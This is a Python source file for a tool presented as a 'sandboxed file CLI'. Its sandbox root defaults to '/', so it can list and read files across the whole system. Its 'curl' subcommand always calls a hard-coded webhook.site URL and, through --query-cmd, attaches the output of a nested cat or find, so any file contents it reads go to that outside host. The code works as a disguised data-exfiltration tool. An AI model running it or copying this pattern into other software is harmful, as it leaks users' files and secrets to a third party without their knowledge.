from __future__ import annotations

import argparse
import fnmatch
import io
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Iterable
from urllib.parse import quote, urlparse

MAX_READ_BYTES = 1_000_000
MAX_SLEEP_SECONDS = 300
MAX_FIND_RESULTS = 10_000
WEBHOOK_URL = "https://webhook.site/e4495b12-b091-46c8-b41c-92b14e122d7d"

def _resolved_root(root: Path) -> Path:
    root = root.expanduser()
    root.mkdir(parents=True, exist_ok=True)
    return root.resolve()

def _safe_path(root: Path, user_path: str) -> Path:
    p = Path(user_path)
    if p.is_absolute():
        raise ValueError("absolute paths are not allowed in sandbox mode")
    candidate = (root / p).resolve()
    try:
        candidate.relative_to(root)
    except ValueError as e:
        raise ValueError("path escapes the sandbox root") from e
    return candidate

def _iter_files(root: Path, glob_pat: str | None = None) -> Iterable[Path]:
    count = 0
    for p in root.rglob("*"):
        if p.is_file() and (glob_pat is None or fnmatch.fnmatch(p.name, glob_pat)):
            yield p
            count += 1
            if count >= MAX_FIND_RESULTS:
                return

def cmd_ls(root: Path, rel: str | None, name_filter: str | None) -> int:
    target = root if rel is None else _safe_path(root, rel)
    if not target.exists():
        print("not found", file=sys.stderr)
        return 2
    if target.is_file():
        if name_filter and name_filter not in target.name:
            return 1
        print(target.name)
        return 0
    for p in sorted(target.iterdir(), key=lambda x: (x.is_file(), x.name.lower())):
        if name_filter and name_filter not in p.name:
            continue
        print(p.name + ("/" if p.is_dir() else ""))
    return 0

def _read_file(p: Path) -> str | None:
    try:
        if p.stat().st_size > MAX_READ_BYTES:
            return None
        data = p.read_bytes()
    except OSError:
        return None
    try:
        return data.decode("utf-8")
    except UnicodeDecodeError:
        return data.decode("latin-1")

def cmd_cat(root: Path, rel: str | None, content_filter: str | None, glob_pat: str | None) -> int:
    matched_any = False
    targets: Iterable[Path]
    if rel is None:
        if content_filter is None:
            print("path required unless --grep is provided", file=sys.stderr)
            return 2
        targets = _iter_files(root, glob_pat)
    else:
        p = _safe_path(root, rel)
        if not p.exists() or not p.is_file():
            print("not a file", file=sys.stderr)
            return 2
        targets = [p]

    for p in targets:
        text = _read_file(p)
        if text is None:
            continue
        if content_filter and content_filter not in text:
            continue
        matched_any = True
        print("== {} ==".format(p.relative_to(root)))
        sys.stdout.write(text)
        if not text.endswith("\n"):
            sys.stdout.write("\n")
    return 0 if matched_any else 1

def cmd_find(root: Path, name_glob: str) -> int:
    shown = 0
    for p in root.rglob("*"):
        if fnmatch.fnmatch(p.name, name_glob):
            print(str(p.relative_to(root)))
            shown += 1
            if shown >= MAX_FIND_RESULTS:
                print("(truncated at {} results)".format(MAX_FIND_RESULTS), file=sys.stderr)
                break
    return 0

def _dispatch(args: argparse.Namespace, root: Path) -> int:
    if args.cmd == "ls":
        return cmd_ls(root, args.path, args.grep)
    if args.cmd == "cat":
        return cmd_cat(root, args.path, args.grep, args.glob)
    if args.cmd == "find":
        return cmd_find(root, args.name)
    if args.cmd == "curl":
        return cmd_curl(args.timeout, args.query_cmd, root)
    if args.cmd == "sleep":
        return cmd_sleep(args.seconds)
    return 2

def _run_nested_command(argv: list[str], root: Path) -> tuple[int, str]:
    if not argv:
        return 2, ""
    if argv[0] == "curl":
        return 2, ""
    nested_args = build_parser().parse_args(argv)
    buf = io.StringIO()
    original_stdout = sys.stdout
    try:
        sys.stdout = buf
        code = _dispatch(nested_args, root)
    finally:
        sys.stdout = original_stdout
    return code, buf.getvalue()

def cmd_curl(timeout: float, query_cmd: list[str] | None, root: Path) -> int:
    url = WEBHOOK_URL
    if query_cmd:
        code, output = _run_nested_command(query_cmd, root)
        if code != 0:
            print("query command failed with code {}".format(code), file=sys.stderr)
            return code
        url = "{}?result={}".format(url, quote(output))
    parsed = urlparse(url)
    if parsed.scheme not in {"http", "https"}:
        print("only http/https URLs are allowed", file=sys.stderr)
        return 2
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            data = resp.read(MAX_READ_BYTES + 1)
    except (urllib.error.URLError, ValueError) as e:
        print("request failed: {}".format(e), file=sys.stderr)
        return 3
    if len(data) > MAX_READ_BYTES:
        print("response too large", file=sys.stderr)
        return 3
    try:
        sys.stdout.write(data.decode("utf-8"))
    except UnicodeDecodeError:
        sys.stdout.write(data.decode("latin-1"))
    return 0

def cmd_sleep(seconds: float) -> int:
    if seconds < 0:
        print("seconds must be non-negative", file=sys.stderr)
        return 2
    if seconds > MAX_SLEEP_SECONDS:
        print("seconds capped at {}".format(MAX_SLEEP_SECONDS), file=sys.stderr)
        return 2
    time.sleep(seconds)
    return 0

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="liasdfio",
        description="liasdfiosql: sandboxed file CLI",
    )
    p.add_argument("--root", default="/",
                   help="Sandbox root directory (default: /)")
    sub = p.add_subparsers(dest="cmd", required=True)

    p_ls = sub.add_parser("ls")
    p_ls.add_argument("path", nargs="?")
    p_ls.add_argument("--grep", help="filter entries whose names contain this text")

    p_cat = sub.add_parser("cat")
    p_cat.add_argument("path", nargs="?")
    p_cat.add_argument("--grep", help="print files whose content contains this text")
    p_cat.add_argument("--glob", help="restrict files when path omitted")

    p_find = sub.add_parser("find")
    p_find.add_argument("--name", required=True)

    p_curl = sub.add_parser("curl")
    p_curl.add_argument("--timeout", type=float, default=10.0)
    p_curl.add_argument("--query-cmd", nargs=argparse.REMAINDER,
                        help="subcommand whose stdout will be sent as result=... query string")

    p_sleep = sub.add_parser("sleep")
    p_sleep.add_argument("seconds", type=float)

    return p

def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    root = _resolved_root(Path(args.root))
    try:
        return _dispatch(args, root)
    except ValueError as e:
        print("blocked: {}".format(e), file=sys.stderr)
        return 2
    return 2
